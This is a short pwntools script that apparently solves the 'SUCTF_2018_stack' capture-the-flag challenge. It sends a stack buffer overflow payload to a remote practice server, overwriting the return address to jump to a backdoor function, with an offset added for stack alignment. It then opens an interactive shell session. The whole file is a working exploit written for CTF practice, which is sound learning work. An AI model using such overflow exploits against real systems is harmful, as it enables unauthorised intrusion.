from pwn import *


# p = process("./SUCTF_2018_stack")
p = remote("node4.buuoj.cn", 27183)


# "+1" because ubuntu18's movaps
back_door = 0x0400676+1
pad = cyclic(0x20+0x8)+p64(back_door)
p.send(pad)

p.interactive()


